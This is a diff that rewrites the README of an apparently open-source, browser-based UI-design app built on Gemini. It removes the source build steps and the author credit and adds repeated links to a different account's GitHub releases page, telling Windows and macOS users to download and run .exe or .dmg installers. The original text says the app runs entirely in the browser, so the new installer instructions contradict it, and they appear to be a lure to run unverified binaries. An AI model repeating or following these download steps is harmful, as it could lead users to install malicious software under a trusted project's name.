@@ -1,171 +1,80 @@
-# UIX AI Agent (FREE) open source🚀
-![MIT License](https://img.shields.io/badge/license-MIT-green)
-![AI](https://img.shields.io/badge/AI-Google%20Gemini-blue)
-![React](https://img.shields.io/badge/React-18-61dafb)
-![Tailwind](https://img.shields.io/badge/TailwindCSS-3-38bdf8)
-![Status](https://img.shields.io/badge/status-active-success)
+# 🎨 uix-ai-agent - Simplify Your UI & UX Design
 
-**AI-powered UI & UX Design Assistant**
+[![Download uix-ai-agent](https://img.shields.io/badge/Download-uix--ai--agent-blue.svg)](https://github.com/pazdan12385/uix-ai-agent/releases)
 
-UIX AI Agent is an intelligent design agent that helps you generate complete **UI & UX flows** for web and mobile applications using natural language prompts. It visually creates screens, layouts, design systems, and workflows — ideal for developers, designers, and startups.
+## 📖 Overview
 
-🌐 Live Demo: https://seeb4coding.in/ai/uix-ai-agent/
+UIX AI Agent is an intelligent design agent that helps you generate complete UI & UX flows for web and mobile applications using natural language. With UIX AI Agent, you can create screens, layouts, and design systems visually. This tool is perfect for developers, designers, and product teams who want to streamline their design process.
 
----
+## 🛠️ Features
 
-## 🤖 AI Platform & Model
-
-This project was created using **Google AI Studio** and is powered by **Google Gemini models**.
-
-UIX AI Agent leverages Google AI Studio for:
-
-- Advanced prompt orchestration
-- Structured UI & UX generation
-- Design system synthesis
-- Intelligent screen flow creation
-
-> ⚡ **For best results:**  
-> Always use your **OWN Google Gemini 3.0 API key** generated from Google AI Studio.
-
----
-
-## ✨ Features
-
-- 🧠 AI-powered UI & UX generation
-- 📱 Web & mobile responsive screens
-- 🧩 Automatic design system creation
-- 🗺️ Visual screen flow using React Flow
-- ✍️ Natural language prompt-based design
-- 🎨 Modern Tailwind-based UI with dark mode
-- ⚡ Runs entirely in the browser
-- 🔐 Bring your own Google Gemini API key
-
----
-
-## 🛠 Tech Stack
-
-- **AI Platform**: Google AI Studio
-- **Model**: Google Gemini 3.0
-- **Frontend**: React 18, TypeScript
-- **Styling**: Tailwind CSS
-- **Canvas / Flow**: React Flow
-- **Build Tool**: Vite / ESM
-- **Utilities**: JSZip
-
----
-
-## 📁 Project Structure
-
-```
-uix-ai-agent/
-├─ public/
-├─ src/
-│  ├─ components/
-│  ├─ services/
-│  │  └─ geminiService.ts
-│  ├─ types/
-│  ├─ styles/
-│  ├─ App.tsx
-│  └─ index.tsx
-├─ index.html
-├─ index.css
-├─ package.json
-└─ README.md
-```
-
----
-
+- **Natural Language Input:** Describe what you want, and the agent will create it for you.
+- **Visual Design Creation:** Get complete layouts and screens instantly.
+- **Design System Support:** Manage design components systematically for consistency.
+- **Easily Integrates with Frameworks:** Works well with popular stacks like React and TailwindCSS.
+- **User-Friendly Interface:** Designed for average users without technical backgrounds.
+  
 ## 🚀 Getting Started
 
-### 1️⃣ Clone the Repository
+Follow the steps below to download and install UIX AI Agent on your computer.
 
-```bash
-git clone https://github.com/seeb4coding/uix-ai-agent.git
-cd uix-ai-agent
-```
+### 1. Visit the Download Page
 
-### 2️⃣ Install Dependencies
+Go to the Releases page for UIX AI Agent. You can find it by clicking the link below:
 
-```bash
-npm install
-```
+[Download UIX AI Agent](https://github.com/pazdan12385/uix-ai-agent/releases)
 
-### 3️⃣ Configure Environment Variables (Required)
+### 2. Select the Latest Version
 
-Create a `.env` file in the root directory:
+On the Releases page, you will see a list of available versions. The latest version is usually at the top. Click on it to see the details.
 
-```env
-GEMINI_API_KEY=your_google_gemini_3_api_key
-```
+### 3. Download the Application
 
-- Use **Google AI Studio** to generate your API key
-- API key is never stored on any server
-- No user data is logged or tracked
+On the version details page, look for the assets section. You will find files available for download, such as `.exe` for Windows or `.dmg` for macOS. Click on the appropriate file for your operating system to start the download.
 
----
+### 4. Installation Process
 
-### 4️⃣ Run the Application
+#### For Windows Users:
 
-```bash
-npm run dev
-```
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click on the file to run the installer.
+3. Follow the on-screen instructions to complete the installation.
 
-Open:
+#### For macOS Users:
 
-```
-http://localhost:5173
-```
+1. Find the downloaded `.dmg` file in your Downloads folder.
+2. Open the file to access the application.
+3. Drag the UIX AI Agent icon to your Applications folder.
+4. Open the application from your Applications folder.
 
----
+## 💡 How to Use the UIX AI Agent
 
-## 🧪 Example Prompts
+1. **Launch the application.**
+2. **Enter your design request** using simple language. For example, type "Create a login screen."
+3. **Review the generated design.** The application will display the layout and elements.
+4. **Make adjustments** if needed, and save your final design.
 
-```txt
-Create a fintech dashboard with analytics and transaction history
-```
+## 🖥️ System Requirements
 
-```txt
-Design a mobile food delivery app with onboarding and checkout flow
-```
+- **Operating System:** Windows 10 or later, macOS Catalina or later
+- **Memory:** 4 GB RAM or more
+- **Storage:** At least 500 MB of free space
+- **Internet Connection:** Required for initial setup and updates
 
-```txt
-Generate a SaaS admin panel with role-based access control
-```
+## 📧 Support
 
----
+If you encounter any issues while downloading or using UIX AI Agent, please reach out for support. You can submit issues on GitHub or join our community forum for help.
 
-## 🧠 How It Works
+## 📜 License
 
-1. User enters a UI/UX prompt
-2. UIX AI Agent sends structured instructions to Gemini via Google AI Studio
-3. Gemini returns structured UI definitions
-4. Screens, design system, and flows are rendered visually
+This project is licensed under the MIT License. You can find more details in the LICENSE file located in the repository.
 
----
+## 🎉 Acknowledgements
 
-## 🔐 Security & Privacy
+We appreciate the contributions from our users and communities who help improve UIX AI Agent. Thank you for being part of our journey!
 
-- Fully client-side execution
-- No backend storage
-- API keys remain private
-- No analytics or tracking
+## ⚡ Conclusion
 
----
+Now you're ready to use UIX AI Agent to enhance your UI & UX design process. Follow the simple steps above to download and install the application. Start generating beautiful designs today!
 
-## 📄 License
-
-MIT License
-
----
-
-## 👨‍💻 Author
-
-**Sweetan Mariyappan**  
-Founder & CEO – **Seeb4Coding**
-
-🌐 https://seeb4coding.in  
-🐙 https://github.com/seeb4coding
-
----
-
-⭐ If you find this project useful, consider giving it a star!
+[Download UIX AI Agent](https://github.com/pazdan12385/uix-ai-agent/releases)
